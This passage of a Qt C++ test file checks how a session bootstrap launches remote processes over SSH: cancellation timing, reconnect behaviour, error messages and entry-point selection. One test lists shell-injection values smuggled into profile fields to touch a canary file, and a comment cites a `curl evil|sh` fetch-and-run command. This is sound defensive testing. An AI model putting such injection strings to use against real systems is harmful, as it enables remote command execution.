// not Failed, and certainly not wired a moment later.
void TstSessionBootstrap::disconnectDuringProbeCutsTheWaitShort()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    // Deliberately long: the case fails by TAKING this long, not by asserting a
    // flag.
    h.boot.setConnectTimeoutMs(10000);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QTimer::singleShot(40, &h.boot, [&h] { h.boot.disconnectSession(); });

    QElapsedTimer clock;
    clock.start();
    QVERIFY(!h.wire());
    const qint64 elapsed = clock.elapsed();

    qInfo() << "disconnect during a 10000 ms pre-flight unblocked after"
            << elapsed << "ms";
    QVERIFY2(elapsed < 2000,
             qPrintable(QStringLiteral("cancel took %1 ms: the wait was not "
                                       "interruptible")
                            .arg(elapsed)));
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, 0);
    QVERIFY(!h.boot.reconnectPending());
    // A cancellation the user asked for is not an error to shout about.
    QCOMPARE(errorSpy.size(), 0);

    // And it stays down: the unwinding attempt must not wire anything after.
    QTest::qWait(100);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(h.boot.rpcDevice() == nullptr);
}

// Same interruption, but on the automatic ladder: setReconnectEnabled(false)
// while a RETRY is stalled in its pre-flight stops it there, and the ladder
// does not arm another rung behind the user's back.
//
// The interruption is armed through onProbeStarted, NOT by first waiting for
// probeCalls to reach 2. That wait looks like the obvious way to catch the
// retry in its pre-flight and is the exact opposite: QTRY_COMPARE drives
// processEvents(), processEvents() dispatches the rung, the rung enters
// probeEndpoint()'s nested loop — and the QTRY does not get to re-evaluate
// anything until that loop returns. It therefore always observed a probe that
// had ALREADY run its full budget out, made the case cost a flat 10 s, and
// "cancelled" nothing: the measured unblock time was 0 ms because the stall
// was over before the stopwatch started.
void TstSessionBootstrap::disablingReconnectDuringProbeStopsTheLadder()
{
    ProbeServer server;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    // Deliberately long: the case fails by TAKING this long, not by asserting
    // a flag.
    h.boot.setConnectTimeoutMs(10000);
    h.boot.setReconnectTimeScale(0.02);  // first rung 20 ms

    QVERIFY(h.wire());  // the server answers, so the initial wire comes up
    server.mute = true;

    // Armed after the live wire, so it belongs to the RETRY's probe and to no
    // other. One-shot: a later rung would find it already spent.
    h.boot.onProbeStarted = [&h] { h.boot.setReconnectEnabled(false); };

    QElapsedTimer clock;
    clock.start();
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);

    QTRY_COMPARE_WITH_TIMEOUT(h.boot.state(), State::Disconnected, 3000);
    const qint64 elapsed = clock.elapsed();
    qInfo() << "reconnect disabled mid-pre-flight unblocked after" << elapsed
            << "ms (budget" << h.boot.connectTimeoutMs() << "ms)";

    // The load-bearing assertion. State alone cannot tell a cancelled probe
    // from one that timed out normally — setReconnectEnabled(false) reaches
    // Disconnected either way. Only the clock does: a pre-flight that ignored
    // the cancel costs the whole 10 s budget.
    QVERIFY2(elapsed < 2000,
             qPrintable(QStringLiteral("cancel took %1 ms of a %2 ms budget: "
                                       "the retry's pre-flight was not "
                                       "interruptible")
                            .arg(elapsed)
                            .arg(h.boot.connectTimeoutMs())));
    // ...and it really was a parked pre-flight that got cancelled, not a rung
    // stopped before it ever fired.
    QCOMPARE(h.boot.probeCalls, 2);

    QVERIFY(!h.boot.reconnectPending());
    QTest::qWait(150);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.probeCalls, 2);    // no further rung ran
    QCOMPARE(h.boot.connectCalls, 1);  // only the original live wire
}

// Mid-wait cancellation, measured: disconnectSession() must return at once and
// the armed rung must never fire.
void TstSessionBootstrap::disconnectMidBackoffStopsImmediately()
{
    Harness h;
    // 1 s first rung at this scale is 200 ms, long enough to interrupt.
    h.boot.setReconnectTimeScale(0.2);
    QVERIFY(h.wire());
    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QVERIFY(h.boot.reconnectPending());

    QTest::qWait(50);  // squarely inside the 200 ms wait
    QElapsedTimer clock;
    clock.start();
    h.boot.disconnectSession();
    const qint64 elapsed = clock.elapsed();

    qInfo() << "disconnectSession() mid-backoff returned in" << elapsed << "ms";
    QVERIFY2(elapsed < 50, "disconnectSession() blocked on the pending rung");
    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.reconnectAttempt(), 0);

    // The rung that was armed does not fire after the fact.
    QTest::qWait(400);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, 1);
    QCOMPARE(h.boot.probeCalls, 1);
}
namespace {

// A stand-in for the remote `node`: an executable that echoes its argv as
// [arg][arg]..., so a test can observe both the exact split the remote login
// shell performed and which entry point it selected. A real interpreter path
// beats rewriting the generated command after the fact — the string under test
// stays byte-for-byte the one SessionBootstrap emits, quoting included.
void writeArgvEcho(const QString& path)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile script(path);
    if (!script.open(QIODevice::WriteOnly))
        return;
    script.write("#!/bin/sh\nfor a in \"$@\"; do printf '[%s]' \"$a\"; done\n");
    script.close();
    script.setPermissions(QFileDevice::ReadOwner | QFileDevice::WriteOwner
                          | QFileDevice::ExeOwner);
}

} // namespace


// A remote process that execs fine and THEN explains itself before exiting is
// the shape of every "the server side is not installed" failure — `sh` printing
// which codeharbord entry points it looked for, node printing that a module is
// missing. That explanation used to go only to channelDiagnostic(), which has
// no consumer, so the user was handed "codeharbord channel closed" and nothing
// else. error() is the only channel that reaches them, so the loss must carry
// it — and must carry the DYING channel's words, not the other channel's
// routine startup banner.
void TstSessionBootstrap::channelLossCarriesThatChannelsLastRemoteWords()
{
    Harness h;
    QVERIFY(h.wire());
    QCOMPARE(h.boot.channels.size(), 2);

    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    // The bridge greets every launch on stderr; that is chatter, not a verdict.
    h.boot.channels.at(1)->writeStderr(
        QStringLiteral("codeharbor-bridge listening on /run/user/1000/ch.sock"));
    QCOMPARE(errorSpy.count(), 0);

    // codeharbord's own last words, then EOF.
    const QString complaint = QStringLiteral(
        "codeharbor: no codeharbord entry point on this server. Tried: "
        "/srv/codeharbor/dist/codeharbord.js, "
        "/srv/codeharbor/remote/dist/codeharbord.js, "
        "/srv/codeharbor/remote/src/codeharbord.ts");
    h.boot.channels.at(0)->writeStderr(complaint);
    h.boot.channels.at(0)->dropRemote();

    QCOMPARE(errorSpy.count(), 1);
    const QString reported = errorSpy.at(0).at(0).toString();
    QVERIFY2(reported.contains(QStringLiteral("codeharbord channel closed")),
             qPrintable(reported));
    QVERIFY2(reported.contains(complaint), qPrintable(reported));
    // The other channel's banner is NOT dragged into codeharbord's death.
    QVERIFY2(!reported.contains(QStringLiteral("listening on")),
             qPrintable(reported));
}

// SessionBootstrap::rpcCommand()/bridgeCommand() splice two ServerProfiles
// fields — nodePath and repoRoot — into a string that an SSH exec request hands
// straight to the remote LOGIN SHELL. Those fields are attacker-influenced: the
// profile store is an ini file, and a shared, synced or simply writable one
// (ServerProfiles::restrictPermissions() narrows it precisely because a
// group-writable ~/.config is the common case) lets someone else choose them.
// A nodePath of `sh -c 'curl evil|sh'` or a repoRoot carrying $(...) must be a
// broken path, never an execution.
//
// Proven against a REAL /bin/sh rather than by eyeballing the quoting: each
// payload tries to create a canary file, and the shell must refuse to make it.
void TstSessionBootstrap::remoteCommandsQuoteHostileProfileFields()
{
    QTemporaryDir dir;
    QVERIFY(dir.isValid());
    const QString canary = dir.filePath(QStringLiteral("CANARY"));
    const QString touch =
        QStringLiteral("touch ") + canary; // spliced into every payload below

    struct Case {
        const char* what;
        QString nodePath;
        QString repoRoot;
    };
    const QList<Case> cases{
        {"command separator in nodePath",
         QStringLiteral("node; ") + touch + QStringLiteral("; :"),
         QStringLiteral("/srv/repo")},
        {"command substitution in nodePath",
         QStringLiteral("$(") + touch + QStringLiteral(")node"),
         QStringLiteral("/srv/repo")},
        {"backticks in nodePath",
         QStringLiteral("`") + touch + QStringLiteral("`node"),
         QStringLiteral("/srv/repo")},
        {"sh -c payload as the whole nodePath",
         QStringLiteral("sh -c '") + touch + QStringLiteral("'"),
         QStringLiteral("/srv/repo")},
        {"quote break-out in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv'; ") + touch + QStringLiteral("; '")},
        {"command substitution in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv/$(") + touch + QStringLiteral(")x")},
        {"newline in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv\n") + touch + QStringLiteral("\nx")},
        {"boolean chain in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv && ") + touch},
        {"leading dash in both", QStringLiteral("-rf"), QStringLiteral("-rf")},
    };

    for (const Case& c : cases) {
        for (const QString& command :
             {SessionBootstrap::rpcCommand(c.nodePath, c.repoRoot),
              SessionBootstrap::bridgeCommand(c.nodePath, c.repoRoot)}) {
            QFile::remove(canary);
            QProcess sh;
            sh.setWorkingDirectory(dir.path());
            sh.start(QStringLiteral("/bin/sh"),
                     {QStringLiteral("-c"), command});
            QVERIFY2(sh.waitForStarted(5000), c.what);
            // bridgeCommand's watchdog blocks on `cat`; EOF releases it.
            sh.closeWriteChannel();
            QVERIFY2(sh.waitForFinished(15000), c.what);
            QVERIFY2(!QFileInfo::exists(canary),
                     qPrintable(QStringLiteral("%1: the remote shell EXECUTED "
                                               "the payload\ncommand: %2")
                                    .arg(QLatin1String(c.what), command)));
        }
    }

    // ...and the quoting is not achieved by mangling honest values: a path with
    // spaces still reaches the shell as ONE argument — in the interpreter AND
    // in the entry point it selects. The entry has to exist on disk now,
    // because the command picks it ON THE SERVER; see
    // remoteEntryPointsSupportBothReleaseAndCheckoutLayouts().
    const QString spacedNode = dir.filePath(QStringLiteral("my node/bin/node"));
    writeArgvEcho(spacedNode);
    const QString spacedRoot = dir.filePath(QStringLiteral("my repo"));
    const QString spacedEntry =
        spacedRoot + QStringLiteral("/remote/src/codeharbord.ts");
    QVERIFY(QDir().mkpath(QFileInfo(spacedEntry).absolutePath()));
    QFile spacedFile(spacedEntry);
    QVERIFY(spacedFile.open(QIODevice::WriteOnly));
    spacedFile.close();

    QProcess argv;
    argv.setWorkingDirectory(dir.path());
    argv.start(QStringLiteral("/bin/sh"),
               {QStringLiteral("-c"),
                SessionBootstrap::rpcCommand(spacedNode, spacedRoot)});
    QVERIFY(argv.waitForFinished(15000));
    QCOMPARE(QString::fromUtf8(argv.readAllStandardOutput()),
             QStringLiteral("[%1][rpc][--stdio]").arg(spacedEntry));
}

// The client must be able to launch BOTH remote layouts, because it is the only
// thing that gets to decide which one it can talk to. rpcCommand()/
// bridgeCommand() used to hardcode <root>/remote/src/*.ts, so the client
// required a full git checkout AND remote node >= 23.6 type-stripping — and the
// release artifact codeharbor-remote.tar.gz (dist + package.json + sql,
// .github/workflows/release.yml) was something nothing could consume.
//
// Selection happens ON THE SERVER, inside the exec we were issuing anyway: no
// extra round trip per connect, no per-profile field for the user to answer,
// and no window in which a client-side probe result goes stale before launch.
// Driven here through a real /bin/sh against real files, so what is asserted is
// the choice the remote login shell would actually make.
void TstSessionBootstrap::remoteEntryPointsSupportBothReleaseAndCheckoutLayouts()
{
    QTemporaryDir dir;
    QVERIFY(dir.isValid());
    const QString root = dir.path();
    // The interpreter lives outside the candidate tree, so placing entry points
    // never disturbs it.
    const QString node = dir.filePath(QStringLiteral("bin/node"));
    writeArgvEcho(node);

    const auto place = [&root](const QString& relative) {
        const QString path = root + QLatin1Char('/') + relative;
        QDir().mkpath(QFileInfo(path).absolutePath());
        QFile file(path);
        file.open(QIODevice::WriteOnly);
        file.close();
        return path;
    };

    // Run one command exactly as the remote login shell would — no rewriting.
    // `node` is the argv echo, so the entry the shell SELECTED is observable.
    // Returns {stdout, stderr}.
    const auto choose = [&root](const QString& command) {
        QProcess sh;
        sh.setWorkingDirectory(root);
        sh.start(QStringLiteral("/bin/sh"), {QStringLiteral("-c"), command});
        sh.closeWriteChannel();  // releases bridgeCommand's `cat` watchdog
        sh.waitForFinished(15000);
        return QStringList{QString::fromUtf8(sh.readAllStandardOutput()),
                           QString::fromUtf8(sh.readAllStandardError())};
    };

    // (1) Nothing installed. The failure must NAME every path it tried, or
    // "it doesn't launch" is unanswerable without an SSH session of your own.
    const QStringList missing = choose(SessionBootstrap::rpcCommand(node, root));
    QVERIFY2(missing.at(0).isEmpty(), qPrintable(missing.at(0)));
    for (const QString& candidate :
         SessionBootstrap::entryCandidates(root, QStringLiteral("codeharbord"))) {
        QVERIFY2(missing.at(1).contains(candidate),
                 qPrintable(QStringLiteral("stderr did not name %1:\n%2")
                                .arg(candidate, missing.at(1))));
    }

    // (2) A plain dev checkout: TypeScript source, type-stripped by node.
    const QString src = place(QStringLiteral("remote/src/codeharbord.ts"));
    QCOMPARE(choose(SessionBootstrap::rpcCommand(node, root)).at(0),
             QStringLiteral("[%1][rpc][--stdio]").arg(src));

    // (3) That checkout, built: dist wins over src. It is what package.json bin
    // points at, and it drops the node >= 23.6 requirement.
    const QString built = place(QStringLiteral("remote/dist/codeharbord.js"));
    QCOMPARE(choose(SessionBootstrap::rpcCommand(node, root)).at(0),
             QStringLiteral("[%1][rpc][--stdio]").arg(built));

    // (4) codeharbor-remote.tar.gz unpacked: dist/ beside package.json and
    // sql/. THE RELEASE ARTIFACT — the layout a normal user actually installs.
    const QString release = place(QStringLiteral("dist/codeharbord.js"));
    QCOMPARE(choose(SessionBootstrap::rpcCommand(node, root)).at(0),
             QStringLiteral("[%1][rpc][--stdio]").arg(release));

    // The bridge resolves through the same ladder and keeps its stdin watchdog.
    const QString bridge = place(QStringLiteral("dist/bridge.js"));
    QCOMPARE(choose(SessionBootstrap::bridgeCommand(node, root)).at(0),
             QStringLiteral("[%1]").arg(bridge));
}

// Guiless: nothing here needs a display, and QTEST_MAIN would pull in
// QGuiApplication (ch_app links Qt6::Gui) and abort headless.
QTEST_GUILESS_MAIN(TstSessionBootstrap)
#include "tst_sessionbootstrap.moc"
